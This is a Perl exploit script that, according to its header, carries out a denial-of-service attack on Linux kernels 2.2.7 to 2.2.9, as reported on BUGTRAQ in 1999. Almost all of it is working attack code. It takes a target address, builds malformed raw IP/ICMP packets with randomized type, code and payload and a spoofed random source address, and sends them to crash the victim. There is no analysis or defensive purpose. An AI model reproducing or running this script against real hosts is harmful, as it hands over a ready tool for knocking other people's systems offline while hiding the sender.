#!/usr/bin/perl
# **************************************************************
# DoS for Linux kernels from 2.2.7 to 2.2.9 reported in BUGTRAQ
# 06/01/99 by Piotr Wilkin <pwl@wotan.2slo.wav.pl>
# An attacker has to be in same ethernet segment with victim 
# I did't test it 
# coded by misteri0 from P.A.T.C.H.
# Requires Net-RawIP-0.09 included in this directory
# Edited for use with toast by Gridmark
# **************************************************************
$| = 1;
require 'getopts.pl';
use Net::RawIP;
Getopts('t:');
die " misteri0\@unet from P.A.T.C.H.\n Usage $0 -t <target>" unless
$opt_t;
srand(time);
$i = 996;
$data .= chr(int rand(255)),$i-- while($i); 

$icmp = new Net::RawIP({
                        ip => {
                                 ihl => 6,
			         tot_len => 1024,
			         id => 1,
			         ttl => 255,
			         frag_off => 0,
			         daddr => $opt_t
                               },
			icmp => { 
			         id => 2650, 
				 data => $data 
				}
		       });
		       
 $j++;
 $icmp->set({
            ip => { saddr => 17000000 + int rand 4261000000 },
            icmp => { 
	             type => int rand(14),
	             code => int rand(10),
		     sequence => int rand(255)
	            }                                           
          });
 $icmp->send;
  print "Linux-DoS sent...\n"
# print "[b00m] " unless $j%1000;	  



